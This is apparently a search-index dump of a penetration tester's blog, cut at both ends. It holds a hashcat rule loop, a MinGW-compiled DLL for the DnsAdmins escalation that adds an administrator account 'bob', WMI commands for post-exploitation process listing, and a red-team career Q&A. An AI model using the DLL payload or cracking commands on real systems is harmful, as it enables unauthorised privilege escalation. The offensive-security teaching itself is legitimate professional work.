-Property Length | % { .\\hashcat64.exe -m1000 20F91778B033F841702E014D3B79148C .\\rockyou.txt --loopback --rules $_.FullName } I’m sure there is a better way to do this. If you know of one please hit me up on Twitter, or other social media. DMs are open. ","date":"2020-02-20","objectID":"https://malicious.link/posts/2020/run-all-rules-hashcat/:0:0","tags":["hashcat","powershell","passwordcracking","passwords"],"title":"Run All Rules for Hashcat","uri":"https://malicious.link/posts/2020/run-all-rules-hashcat/"},{"categories":null,"content":"Compiling a Windows DLL has always been a pain for me. Getting Visual Studio working is frustrating (or at least used to be, before VS2019). I ran into this same issue recently. I didn’t have Visual Studio readily available because the VMs I had built for the task were left behind. I always knew that MinGW could build DLLs; however, I never spent the time to figure it out. Now was that time. I needed a DLL that wouldn’t be caught by AV, and I could use it to exploit the DNS Admin escalation path. You can read all about the DNS Admin escalation path in the resources below, but the TL;DR boils down to if you happen to be in the local group called “DnsAdmins” on a Domain Controller, then you have permission to load a DLL into the DNS service running as SYSTEM. (DnsAdmins is a LOCAL group, which threw me off for a long time about this attack. Trying to find it at the domain level was super annoying. On my test DC, I could see it, but when I was doing engagements, I never seemed to find it.) ","date":"2020-02-09","objectID":"https://malicious.link/posts/2020/compiling-a-dll-using-mingw/:0:0","tags":["mingw","dllmain","cpp","compiling"],"title":"Compiling a DLL using MingGW","uri":"https://malicious.link/posts/2020/compiling-a-dll-using-mingw/"},{"categories":null,"content":"Resources DNS Admin Resources: https://github.com/kazkansouh/DNSAdmin-DLL https://github.com/dim0x69/dns-exe-persistance https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise https://adsecurity.org/?p=4064 https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83 Compiling DLLs with MinGW: https://blog.didierstevens.com/2019/10/28/quickpost-compiling-service-dlls-with-mingw-on-kali/ https://blog.didierstevens.com/2018/07/10/quickpost-compiling-dlls-with-mingw-on-kali/ ","date":"2020-02-09","objectID":"https://malicious.link/posts/2020/compiling-a-dll-using-mingw/:1:0","tags":["mingw","dllmain","cpp","compiling"],"title":"Compiling a DLL using MingGW","uri":"https://malicious.link/posts/2020/compiling-a-dll-using-mingw/"},{"categories":null,"content":"Compiling … here is the super exciting output from compiling the DLL… root@kali:~/dnsadmin# x86_64-w64-mingw32-gcc -shared -o evil.dll evildll.cpp root@kali:~/dnsadmin# ","date":"2020-02-09","objectID":"https://malicious.link/posts/2020/compiling-a-dll-using-mingw/:2:0","tags":["mingw","dllmain","cpp","compiling"],"title":"Compiling a DLL using MingGW","uri":"https://malicious.link/posts/2020/compiling-a-dll-using-mingw/"},{"categories":null,"content":"Example Code #include \u003cwindows.h\u003e #include \u003cstdlib.h\u003e // Here so I remember how to compile it. // x86_64-w64-mingw32-gcc -shared -o evil.dll evildll.cpp extern \"C\" __declspec(dllexport) int DnsPluginInitialize(PVOID a1, PVOID a2) { system(\"net.exe user bob Password123 /add\"); system(\"net.exe localgroup administrators bob /add\"); return 0; } extern \"C\" __declspec(dllexport) int DnsPluginCleanup() { return 0; } extern \"C\" __declspec(dllexport) int DnsPluginQuery(PSTR a1, WORD a2, PSTR a3, PVOID a4) { return 0; } BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) { switch (fdwReason) { case DLL_PROCESS_ATTACH: OutputDebugString(\"DLL_PROCESS_ATTACH\"); break; case DLL_THREAD_ATTACH: OutputDebugString(\"DLL_THREAD_ATTACH\"); break; case DLL_THREAD_DETACH: OutputDebugString(\"DLL_THREAD_DETACH\"); break; case DLL_PROCESS_DETACH: OutputDebugString(\"DLL_PROCESS_DETACH\"); break; } return TRUE; } ","date":"2020-02-09","objectID":"https://malicious.link/posts/2020/compiling-a-dll-using-mingw/:3:0","tags":["mingw","dllmain","cpp","compiling"],"title":"Compiling a DLL using MingGW","uri":"https://malicious.link/posts/2020/compiling-a-dll-using-mingw/"},{"categories":null,"content":"One of the most useful things when doing post exploitation on Linux is grabbing a full process list. One of the reasons this is useful is because it includes the arguments passed to these processes. The arguments for a process can tell you where configs are, what passwords might have been used or just tell you the correct arguments to use when running the process yourself. user 281741 76190 2 14:18 pts/14 00:02:34 java -Xmx3733m -XX:+UseG1GC -jar /usr/share/zaproxy/zap-2.8.1.jar user 283340 281741 0 14:25 pts/14 00:00:00 /home/user/.ZAP/webdriver/linux/64/geckodriver --port=10696 -b /usr/bin/firefox user 283358 283340 0 14:25 pts/14 00:00:08 [firefox-esr] \u003cdefunct\u003e On Windows however, this is a lot harder to do. As such, nearly all offensive tools that pull a process list only tell you what process it is, the PID, and maybe (if you have the permissions to view it) what user is running that process. C:\\Users\\uberuser\u003etasklist /v Image Name PID Session Name Session# Mem Usage Sta tus User Name CPU Time Win dow Title ========================= ======== ================ =========== ============ === ============ ================================================== ============ === ===================================================================== System Idle Process 0 Services 0 4 K Unk nown NT AUTHORITY\\SYSTEM 866:44:11 N/A System 4 Services 0 140 K Unk nown N/A 0:26:53 N/A smss.exe 220 Services 0 1,140 K Unk nown N/A 0:00:00 N/A csrss.exe 308 Services 0 3,924 K Unk The only way that I can find to get the command line arguments on Windows is through WMI. (Or 1 of 100 agents that people love to install on end points if you have access to it) Here is how you do it from cmd: WMIC path win32_process get Caption,Processid,Commandline C:\\Users\\uberuser\\Desktop\u003eWMIC path win32_process get Caption,Processid,Commandline Caption CommandLine ProcessId rdpclip.exe rdpclip 1896 taskhostex.exe taskhostex.exe 204 explorer.exe C:\\Windows\\Explorer.EXE 3748 ServerManager.exe 2304 vmtoolsd.exe \"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\" -n vmusr 60 firefox.exe \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -contentproc --channel=\"3728.0.819826060\\1553883004\" -parentBuildID 20200107212822 -prefsHandle 1132 -prefMapHandle 1124 -prefsLen 1 -prefMapSize 216481 -greomni \"C:\\Program Files\\Mozilla Firefox\\omni.ja\" -appomni \"C:\\Program Files\\Mozilla Firefox\\browser\\omni.ja\" -appdir \"C:\\Program Files\\Mozilla Firefox\\browser\" - 3728 \"\\\\.\\pipe\\gecko-crash-server-pipe.3728\" 1248 gpu 2408 WMIC.exe WMIC path win32_process get Caption,Processid,CommandLine 4428 And via PowerShell Get-WmiObject Win32_Process -Filter \"name = 'firefox.exe'\" | Select-Object CommandLine PS C:\\Users\\uberuser\u003e Get-WmiObject Win32_Process -Filter \"name = 'firefox.exe'\" | Select-Object CommandLine CommandLine ----------- \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -os-restarted \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -contentproc --channel=\"3728.0.819826060\\1553883004\" -parentBuildID 2... \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -contentproc --channel=\"3728.13.335070555\\878171781\" -childID 2 -isFo... \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -contentproc --channel=\"3728.20.446400134\\1597941165\" -childID 3 -isF... \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -contentproc --channel=\"3728.34.1773646251\\252067495\" -childID 5 -isF... So, to add to my toolkit and so I don’t have to remember the exact commands every time, I wrote a super simple C# snippet to do it for me (I’m sure there at 100 projects on Github and elsewhere that already do this but I didn’t see them when I looked) https://gist.github.com/mubix/a8882940311d511dfe0e598e5a3fd1a8 ","date":"2020-01-17","objectID":"https://malicious.link/posts/2020/get-process-list/:0:0","tags":["csharp","processes","wmi"],"title":"Get Process List with Command Line Arguments","uri":"https://malicious.link/posts/2020/get-process-list/"},{"categories":null,"content":"First person to send me an email to the email address at the end of this challenge will get a free ticket to ShmooCon 2020 ","date":"2020-01-08","objectID":"https://malicious.link/posts/2020/2020-shmoocon-ticket/:0:0","tags":["shmoocon","tickets","contest"],"title":"2020 ShmooCon Ticket","uri":"https://malicious.link/posts/2020/2020-shmoocon-ticket/"},{"categories":null,"content":"Update: Bug in Zip Looks like there is a bug in CyberChef (https://github.com/gchq/CyberChef/issues/671) so I’ll make sure everyone knows if you have a zip file during this challenge, the password is “!!!secret!!!” and you have to unzip it using CyberChef. ","date":"2020-01-08","objectID":"https://malicious.link/posts/2020/2020-shmoocon-ticket/:1:0","tags":["shmoocon","tickets","contest"],"title":"2020 ShmooCon Ticket","uri":"https://malicious.link/posts/2020/2020-shmoocon-ticket/"},{"categories":null,"content":"Status: CLAIMED! Congrats @chaumurky! -----BEGIN PGP MESSAGE----- Version: Keybase OpenPGP v2.1.6 Comment: https://keybase.io/crypto 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 =iOhK -----END PGP MESSAGE----- ","date":"2020-01-08","objectID":"https://malicious.link/posts/2020/2020-shmoocon-ticket/:2:0","tags":["shmoocon","tickets","contest"],"title":"2020 ShmooCon Ticket","uri":"https://malicious.link/posts/2020/2020-shmoocon-ticket/"},{"categories":null,"content":"Created the 2020 Unofficial ShmooCon Hiring List. To get on the list is just complete the following form: https://forms.gle/TNwx16SbmbC19jVe9 (One small tip, first come first serve, so if you want to be on the top of the list it’s best to submit the best info you have vs waiting on anyone, I don’t change the list order for anyone.) Direct Link to the Hiring List Google Doc: https://docs.google.com/spreadsheets/d/1E--eIxRQyMjdX40GCrDv8pBZhJ7QZEDGdD-Hz8bVyvs/ ","date":"2020-01-07","objectID":"https://malicious.link/posts/2020/2020-shmoocon-hiring-list/:0:0","tags":["shmoocon","hiring"],"title":"2020 ShmooCon Hiring List","uri":"https://malicious.link/posts/2020/2020-shmoocon-hiring-list/"},{"categories":null,"content":"Recently I had the privilege and honor to be asked for my input into the Tribe of Hackers - Red Team Edition book. This book is a compilation of a bunch of opinions from industry professionals on 21 questions. The following blog post is my answers to these questions. If you would like to read all of the other responses and different thoughts, you should buy the book. Here are the links: Wiley - Tribe of Hackers: Red Team Edition ($25 at time of post) Amazon - Tribe of Hackers: Red Team Edition ($16.30 at time of post) ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:0:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"1. How did you get your start on a red team? Craig Balding (@craigbalding) gave me the opportunity to join my first “Red Team,” which turned out to be one of the most rewarding teams and jobs I’ve ever had the pleasure to be a part of. I did this after being many other things, however. I had been a vulnerability scan engineer, a pentest consultant, a tier 1 and 2 incident responder, a forensic analyst, a firewall admin, an IT architect, an on-call help desk tech, and an IT clerk. I believe that having this wide range of experience helped me obtain this opportunity and the ability to interview successfully. Do you have to have the same path? Not at all, I have seen a Mathematician make the leap directly over into pentesting and destroy networks because they understood cryptography better than the network engineers did. I have seen stay at home moms become fantastic SOC analysts out of the blue. Everyone’s path in this industry is different, it’s all about obtaining the experience or expertise to do the job you want to do. ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:1:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"2. What is the best way to get a red team job? Apply? This is like asking how to get a job period. Red Team jobs don’t follow any particular set of rules. Apply for the jobs that are out there and be qualified to do so. Therein lies the tricky bit though right? First, you have to believe that you are qualified, then you have to convince someone else (the recruiter/hiring manager) that you are qualified. Many hiring managers talk about the “hacker mindset.” This is the headspace where the intended use of something is ignored or expanded upon. The same process needs to be applied to getting a job. Hack it. Think of qualifications as a list of intended uses, RTFM, and go from there. ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:2:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"3. How can someone gain red team skills without getting in trouble with the law? This question kind of pisses me off because even in 2005 when I started learning about security, there were plenty of avenues to learn without committing felonies. Sure, in the BBS days and those of the “early” Internet, resources were lacking, and many from that era still wear it as a badge of honor. This is fine, they learned the only way they could at the time. That time is long gone. If you think you have to break the law, then someone has misguided you. This does take one minor thing for granted, that you have a computer that you are authorized to use and have Internet connectivity, which is not always the case, especially in third-world countries. If you have neither of these, then those situations may still be out there. I do not condone breaking to law, and no matter how I feel about the law in my own country, breaking laws isn’t the way to fix them. Let me put away my soapbox real quick so we can talk about the ways you can actually do this in 2019. Red teaming can be made up of a ton of different skill sets from routing, switching, Active Directory, wireless (not just 802.11), physical security, IoT (Internet of Things), web, cloud, cryptography, to databases, etc., etc., etc. You can also come from a vast array of backgrounds and study an even wider variety of topics that it wouldn’t fit in this book without making a Tomb of Hackers. However, VulnHub is where I point most people. On VulnHub you download VMs and attempt to get “root” on them. The great thing about VulnHub is even if you are just beginning you can download a VM, boot it up, have a go, realize you have no idea where to start and read one of the myriads of walk-throughs they have on the site for each VM. There is ZERO harm in reading ALL of the walkthroughs many times over and getting the practice of doing getting root the same way they do and eventually understanding WHY they are doing it. ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:3:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"4. Why can’t we agree on what a red team is? Because it means different things to everyone and that’s ok. Why does it have to have a precise definition? Can you tell me what a SOC (Security Operations Center) looks like in specific terms? Or what makes up a hospital even? We have a ton of collections of things that are defined by general ideas, and that is fine. Such as the fact that a hospital includes an Emergency room but not all of them include long term cancer wards, or that a SOC must have screens on the wall for NO REASON WHATSOEVER!! and some are 24/7, and some are not. These general ideas are accepted in society, why isn’t it ok for a red team to also be amorphous? The definition of a communicated word is one in which the parties involved understand it, and for the most part, when a customer and a consultant speak of red team engagements, there is an understanding of what that entails through mediums like the Statement of Work (SoW) and Rules of Engagement (RoE). ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:4:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"5. What is one thing the rest of information security doesn’t understand about being on a red team? What is the most toxic falsehood you have heard related to red, blue, or purple teams? I have no idea what the rest of the information security community/world/whatever understands or doesn’t understand. One thing I wish was more prevalent is the core value that you are part of the team that’s sole purpose is to make the company better and more secure. This doesn’t happen by pointing and laughing like an outsider. The company has a vulnerability, that’s your company (even if you are a consultant or contractors for them for the week). Get to work. As for toxic falsehoods? Why does anyone care? Go to work, do good things, or build a company, and do good things. Run your own race to your personal goals. Don’t worry about what the “rest” of information security is doing, or what toxic drama is next up on the Internet. All of that is a waste of your time. You only get so much time on this earth, and you choose who you give that time to, random security fads, or drama is just not worth it. ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:5:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"6. What is the appropriate point in the maturation of a security program to introduce a formal red team into an organization? As soon as they can afford it. Red Teams are like human security unit tests. Everyone knows they need unit testing in their code, and they put them in as soon as it starts becoming needed or things start breaking. Same goes for Red teams, the moment you begin to need a Blue team is about the same time you need a Red team. ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:6:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"7. What has been effective at explaining the value of red teaming to a reluctant or non-technical client, or even to your own organization? Listening. If you are there to help an organization genuinely, they will feel that and not be reluctant anymore. If they continue to be hesitant, then they don’t want your services, you should let them make that decision and move on. ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:7:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"8. What is the least bang-for-your-buck security control that you see implemented? Logs. But what is the most bang-for-your-buck? Also logs. The problem with logs is that if you don’t have a skilled team to look at said logs, they are useless and moreover they cost more money the more you have just sitting around. So unlike AV or a SEIM or several other things that can be considered unnecessary under different contexts they usually don’t cost you exponentially more money as logs do. ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:8:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"9. Have you ever recommended not doing a red team and offered something else more suitable, even when a customer asked for one? What have you recommended? Plenty of times. I did a talk called Open Source Pentesting where I talked about the myriad of different offerings that I have offered and think other firms should offer because they fit better than a standard pentest or red team assessment, or source code review. Ultimately though, the customer is the one making a business decision to purchase your services, counseling them to do something different may fall on deaf ears, or they may have a perfectly good reason for doing so that you have no purview to. You have to be ok with that. ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:9:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"10. What’s the most important or easiest-to-implement control that can prevent you from compromising a system or network? For example, how can we help small and medium businesses who have a smaller budget and staff? Good password management. Passwords are the bane of information security right now. 2FA/MFA is a solution, but they are still cumbersome or impossible to incorporate into the authentication platform a company uses. Most pentests and red team assessments that I perform these days start with some kind of initial toe hold into the organization, and then the hunt for credentials begins. API keys, SSH keys, passwords, anything that can get me to a higher level or more access than that toe hold. This is why I think a company should require the use of password managers for all work-based authentication, this includes API keys (vaulting products help make this a reality). A way to force this is to change your internal password minimum to something like 40 characters. Initial login (in order to get to the password manager can be done via a smart card, FIDO or another token-based product. Even mobile devices these days can act as FIDO devices which would remove the need to deploy and manage a fleet of devices for authentication. ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:10:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"11. Why do you feel it is critical to stay within the rules of engagement? Because it’s a felony in the US if you don’t (breaking into a system without authorization) and liability insurance only goes so far. It’s also an agreed-upon document (Rules of Engagement). This is like asking, “why should you honor a contract?”. ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:11:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"12. Tell about a time you were busted on a penetration test (physical, network, social engineering, etc.). How did you handle it? This happens a lot and while I do get pissed (mostly at myself for being stupid in some way), it quickly becomes admiration for what the defense team put in place. I did a talk called Attacker Ghost Stories about several different occasions when I was caught. One of my favorite stories was the result of a honey pot (an intentionally vulnerable looking software). Once upon a time in a red team far far away my team had harvested a few sets of credentials from a phishing exercise, and I wanted to test them out on a web application page I found which showed a number of indicators that Active Directory authentication was in play on this page (such as a DOMAIN\\jdoe) example. I proceeded to use each of the credentials the team had obtained, testing to see if the credentials were good and if they provided any higher-level access to the web application. Unbeknownst to our team, this was a page that did not actually have connectivity to any backend much less Active Directory. It did, however, alert the administrators to every single user and password that we tried against that page so that they could disable them and have their passwords changed. This page was set up by a system administrator, not even the blue team (defense team) as a way to catch leaked credentials. Needless to say, our team was very displeased with me that I had burned all of their work. ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:12:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"13. What is the biggest ethical quandary you experienced while on an assigned objective? There was a law firm I was testing. It was an internal test, and responder was pretty new to the industry, so it was a pretty quick assessment. I was sitting there cracking passwords from the domain so I could access the target data for this assessment ( dummy case records in their case data storage system) when I saw a credential crack for one of the top partners at this firm. The password was “poisonedher.” This freaked me out. What should I do? Should I call the police? What would I tell the police if I called them? I had no proof of any wrongdoing. Did this person confess (as they secretly typed in their password every day) that they were or had poisoned some woman somewhere? Or did they just really like murder mystery books? I expressed my concerns to the engagement point of contact at the law firm, but I was agonizing over if to tell anyone else or not the whole week allotted for the test. A few months later the partner no longer worked at the firm and that’s the last information I got on the subject. The story still gives me the chills to this day. ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:13:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"14. Describe the “team” aspect of red teaming. How do you work together to get the job done, including documentation, reporting, and working with the blue team afterward? It’s a team, much like any other. Teams combine strengths and compensate for weaknesses, and every team is different. What works for my team might not work for yours. Good leadership, and using a fast-fail approach when trying new things to find out what works best for your team has been highly effective for me in the past. What platform works for most of the team when documenting findings? Is it MS Word, OneNote, Google Docs, Etherpad. This is all about styles, personal preferences, and effectiveness. Communication about what works, what doesn’t work, and what to try next is vital. ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:14:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"15. What is your approach to debriefing and supporting blue teams after an operation is completed? That’s easy, you give them as much as you can. Everyone has a schedule to keep, but if I had infinite time, I would go on-site with every single customer and fix every single one of the findings I found during an engagement. Every company is understaffed right now when it comes to security talent. Being that extra body, with intimate familiarity with the findings (since you found them) and showing the effort to find the right person and right fix would do leaps and bounds more help in this industry than shoveling reports over a table. ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:15:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"16. If you were to switch to blue team, what would be your first step to better defend against attacks, and if it isn’t commonly done already, why do you suppose that’s the case? This really depends on what is considered the “blue” team. If that means incident response, then what I would do is forward Windows event logs, deploy Sysmon and OSQuery across my fleet of systems to talk to a central logging server and set up alerts. I don’t think this is done very much because it’s a free solution and takes expertise (which is in high demand) to deploy. Blinky boxes are still the highlight of InfoSec because they come with experts to implement and fix if things go wrong. If by “blue” team, we mean security teams in general, then I would focus on making security policies like minimum password lengths that force password managers and 2FA. I don’t think this is done as much because it takes a lot of work to get approved and is usually a highly political process. ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:16:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"17. A lot of people complain about writing testing reports, and a lot of customers complain about the quality of reports. What is some practical advice on writing a good report? Work with your customers to identify the most beneficial medium of reporting. While the industry standard is a 40 some-odd page report, it doesn’t have to be this way. Many companies would rather reports be just imported into a ticketing system. Other companies prefer having their reports in the form of a slide deck with commentary on a conference bridge. If you never discuss the most efficient method, you’ll never do anything different, and probably just give them another PDF or DOCX to be ignored. ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:17:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"18. How do you ensure your program results are valuable to people who need a full narrative and context, instead of a showcase of their weaknesses vs. your skillset? Objection! Leading the witness! In all seriousness, we in the industry are a lazy bunch. We spend a ton of time on things we find interesting and valuable, and the drudgery of writing reports, findings and explaining our discoveries to others is tedious. We want to discover and be left alone. We have to overcome this. It’s like working at McDonald’s and sitting there, making only the things we want to eat instead of the food being ordered. Part of maturity is learning that work is work because it involves things that are beneficial to persons other than yourself. Put in the work to figure out the weaknesses, document how they were found, then spend the time to research fixes, multiple if possible, and test out those fixes. I’ve tested various “industry-accepted” fixes for common vulnerabilities that just don’t work, or only work partially. Do the work, spend the time. You’re getting paid to make the customer better, not show how cool you can be. ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:18:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"19. How do you recommend security improvements other than pointing out where it’s insufficient? General Electric has one of the most well-known leadership tracks in the industry, companies worldwide send their managers to Crotonville. While I personally didn’t attend any of the Crotonville training sessions, I had the fantastic opportunity to interact with a large number of peers and leaders who had. One of the main themes I heard most repeated from that training program centers around motivation. Motivating others to do as you want them to. But, getting back to the question, “Insufficient” it a purely subjective, especially in the Information Security space. Chris Nickerson said it best in his TED talk where he said that security is a feeling, so you have to treat it that way. Identifying with how someone feels when you report a vulnerability to them and locating the right motivation to have them fix it can make a huge difference. If you go into a room huffing and puffing that you know better and that this change or that change will secure the company better, you are going to get ignored. We all have better things to do than listen to someone ranting and raving about the next ‘worst’ thing. ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:19:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team Edition","uri":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/"},{"categories":null,"content":"20. What non-technical skills or attitudes do you look for when recruiting and interviewing red team members? Or, what is one of the most beneficial non-technical skills you use for red team activities? I would say extreme curiosity is probably the primary non-technical skill I look for in candidates. If you aren’t curious, you aren’t going to go digging through a pile of manuals to find the one URL that isn’t protected by authentication or that one share out of ten thousand that happens to have a PASSWORDS.XLS in it. I use my insatiable curiosity regularly during red team assessments to poke at everything and anything (within the RoE). ","date":"2019-08-19","objectID":"https://malicious.link/posts/2019/tribe-of-hackers-redteam/:20:0","tags":["tribe of hackers","book"],"title":"Tribe of Hackers: Red Team 